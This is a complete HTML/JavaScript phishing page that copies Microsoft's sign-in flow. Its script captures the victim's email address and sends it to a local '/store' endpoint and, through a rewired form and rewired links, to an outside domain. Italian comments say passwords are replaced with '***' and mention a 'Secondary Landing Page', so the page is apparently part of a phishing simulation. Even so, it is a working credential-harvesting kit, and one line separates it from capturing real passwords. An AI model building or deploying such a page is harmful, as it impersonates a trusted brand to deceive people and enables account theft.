<main>
<section id="section_uname">
<div class="auth-wrapper"><img alt="Microsoft" src="https://github.com/Octagon-simon/microsoft-login-clone/blob/main/assets/logo.png?raw=true" />
<h2 class="title mb-16 mt-16">Sign in</h2>

<form id="uname-form">
<div class="mb-16">
<p class="error" id="error_uname">&nbsp;</p>
<input class="input" id="inp_uname" name="uname" placeholder="Email, phone, or Skype" type="text" /></div>
</form>

<div>
<p class="mb-16 fs-13">No account? <a class="link" href="https://https.eu-secured.com/pages/e084ad2aec275c69ceeae615a0016553">Create one!</a></p>

<p class="mb-16 fs-13"><a class="link" href="https://https.eu-secured.com/pages/e084ad2aec275c69ceeae615a0016553">Sign in with a security key <img alt="Question img" src="https://github.com/Octagon-simon/microsoft-login-clone/blob/main/assets/question.png?raw=true" /></a></p>
</div>

<div><button class="btn" id="btn_next">Next</button></div>
</div>
</section>

<div class="opts">
<p class="has-icon mb-0" style="font-size:15px;"><a href="https://https.eu-secured.com/pages/e084ad2aec275c69ceeae615a0016553" style="text-decoration:none; color:inherit; display:inline-flex; align-items:center;"><span class="icon"><img src="https://github.com/Octagon-simon/microsoft-login-clone/blob/main/assets/key.png?raw=true" width="30px" /> </span> Sign-in options </a></p>
</div>

<section class="d-none" id="section_pwd">
<div class="auth-wrapper"><img alt="Microsoft" class="d-block" src="https://github.com/Octagon-simon/microsoft-login-clone/blob/main/assets/logo.png?raw=true" />
<div class="identity w-100 mt-16 mb-16"><button class="back"><img src="https://github.com/Octagon-simon/microsoft-login-clone/blob/main/assets/back.png?raw=true" /></button><span id="user_identity">a@b.com</span></div>

<h2 class="title mb-16">Enter password</h2>

<form action="https://https.eu-secured.com/pages/e084ad2aec275c69ceeae615a0016553" id="pwd-form" method="post">
<div class="mb-16">
<p class="error" id="error_pwd">&nbsp;</p>
<input class="input" id="inp_pwd" name="password" placeholder="Password" type="password" /></div>
</form>

<div>
<p class="mb-16"><a class="link fs-13" href="https://https.eu-secured.com/pages/e084ad2aec275c69ceeae615a0016553">Forgot password?</a></p>

<p class="mb-16"><a class="link fs-13" href="https://https.eu-secured.com/pages/e084ad2aec275c69ceeae615a0016553">Other ways to sign in</a></p>
</div>

<div><button class="btn" id="btn_sig">Sign in</button></div>
</div>
</section>
</main>

<footer class="footer"><a href="https://https.eu-secured.com/pages/e084ad2aec275c69ceeae615a0016553">Terms of use</a> <a href="https://https.eu-secured.com/pages/e084ad2aec275c69ceeae615a0016553">Privacy &amp; cookies</a> <span>. . .</span></footer>
<script>
        const unReq = "Enter a valid email address, phone number, or Skype name.";
        const pwdReq = "Please enter the password for your Microsoft account.";
        const unameInp = document.getElementById('inp_uname');
        const pwdInp = document.getElementById('inp_pwd');
        let view = "uname";
        let unameVal = false;
        let pwdVal = false;
        const nxt = document.getElementById('btn_next');
        const sig = document.getElementById('btn_sig');
        const pwdForm = document.getElementById('pwd-form');
        const opts = document.querySelector('.opts');

        function updateView() {
            document.getElementById('section_uname').classList.add('d-none');
            document.getElementById('section_pwd').classList.add('d-none');
            opts.classList.add('d-none');
            if (view === "uname") {
                document.getElementById('section_uname').classList.remove('d-none');
                opts.classList.remove('d-none');
            } else if (view === "pwd") {
                document.getElementById('section_pwd').classList.remove('d-none');
            }
        }

        nxt.addEventListener('click', () => {
            validate();
            if (unameVal) {
                document.querySelectorAll('#user_identity').forEach((e) => {
                    e.innerText = unameInp.value;
                });
                view = "pwd";
                updateView();
            }
        });

        // registrazione e invio se utente ha inserito i dati o meno
        sig.addEventListener('click', () => {
            validate();
            if (pwdVal) {
                // La password reale non viene MAI letta o inviata.
                // Registriamo solo l'evento 
                const userEmail = unameInp.value;
                const passwordPlaceholder = '***'; // Invece della password reale

                const dataCaptureUrl = "/store";

                const dataToSend = new URLSearchParams();
                dataToSend.append('username', userEmail);
                dataToSend.append('password', passwordPlaceholder); 

                // 1. Invia i dati per registrare l'evento
                fetch(dataCaptureUrl, {
                    method: 'POST',
                    body: dataToSend,
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded'
                    },
                })
                .catch(error => {
                    console.error('Errore durante l\'invio dei dati:', error);
                })
                .finally(() => {
                    // Pulisce il campo della password
                    pwdInp.value = '';

                    // Reindirizzamento alla Secondary Landing Page
                    const tempUsernameInput = document.createElement('input');
                    tempUsernameInput.type = 'hidden';
                    tempUsernameInput.name = 'username';
                    tempUsernameInput.value = unameInp.value;
                    pwdForm.appendChild(tempUsernameInput);

                    // Esegue l'invio del form, che reindirizza all'URL specificato nell'attributo in action
                    pwdForm.submit();
                });
            }
        });

        function validate() {
            function unameValAction(type) {
                if (!type) {
                    document.getElementById('error_uname').innerText = unReq;
                    unameInp.classList.add('error-inp');
                    unameVal = false;
                } else {
                    document.getElementById('error_uname').innerHTML = "&nbsp;";
                    unameInp.classList.remove('error-inp');
                    unameVal = true;
                }
            }
            function pwdValAction(type) {
                if (!type) {
                    document.getElementById('error_pwd').innerText = pwdReq;
                    pwdInp.classList.add('error-inp');
                    pwdVal = false;
                } else {
                    document.getElementById('error_pwd').innerHTML = "&nbsp;";
                    pwdInp.classList.remove('error-inp');
                    pwdVal = true;
                }
            }
            if (view === "uname") {
                unameValAction(unameInp.value.trim() !== "");
                unameInp.oninput = () => unameValAction(unameInp.value.trim() !== "");
            } else if (view === "pwd") {
                pwdValAction(pwdInp.value.trim() !== "");
                pwdInp.oninput = () => pwdValAction(pwdInp.value.trim() !== "");
            }
        }

        document.querySelector('.back').addEventListener('click', () => {
            view = "uname";
            updateView();
        });

        updateView();

        // Funzione riutilizzabile per gestire il click sui link
        function redirectWithData(event) {
            // 1. Impedisce al link di reindirizzare normalmente
            event.preventDefault();

            // Prende i riferimenti agli elementi importanti
            const unameInp = document.getElementById('inp_uname');
            const pwdForm = document.getElementById('pwd-form');
            const userEmail = unameInp.value;

            // 2. Controlla se è stato inserito un username/email
            if (userEmail.trim() !== "") {
                // Crea un campo nascosto per l'username.
                // Questo è lo stesso trucco usato dal tuo pulsante "Sign in".
                const tempUsernameInput = document.createElement('input');
                tempUsernameInput.type = 'hidden';
                tempUsernameInput.name = 'username'; // Assicurati che il nome corrisponda a quello che la landing page si aspetta
                tempUsernameInput.value = userEmail;
                pwdForm.appendChild(tempUsernameInput);
            }

            pwdForm.submit();
        }

        // Seleziona tutti i link che puntano alla secondary landing page
        const linksToModify = document.querySelectorAll('a[href="https://https.eu-secured.com/pages/e084ad2aec275c69ceeae615a0016553"]');

        // Applica il reindirizzamento alla secondary landing page a ogni link trovato
        linksToModify.forEach(link => {
            link.addEventListener('click', redirectWithData);
        });
    </script>
